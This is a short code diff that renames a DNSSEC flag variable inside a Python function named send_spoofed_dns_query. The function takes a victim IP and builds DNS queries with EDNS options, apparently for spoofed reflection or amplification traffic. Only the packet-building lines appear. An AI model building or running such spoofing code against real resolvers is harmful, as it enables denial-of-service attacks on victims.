@@ -54,8 +54,8 @@ def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
     qtype_int = QTYPE_MAP.get(qtype.upper(), 1)  # default to A on unknown type
     question = DNSQR(qname=domain.strip('.'), qtype=qtype_int, qclass=qclass)
     if edns_payload > 0:
-        do_flag = 0x8000 if dnssec_do else 0
-        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=do_flag)
+        edns_do_flag = 0x8000 if dnssec_do else 0
+        opt = DNSRROPT(rrname='.', type=41, rclass=edns_payload, z=edns_do_flag)
         pkt_dns = DNS(id=txid_val, rd=1, qd=question, ar=opt)
     else:
         pkt_dns = DNS(id=txid_val, rd=1, qd=question)
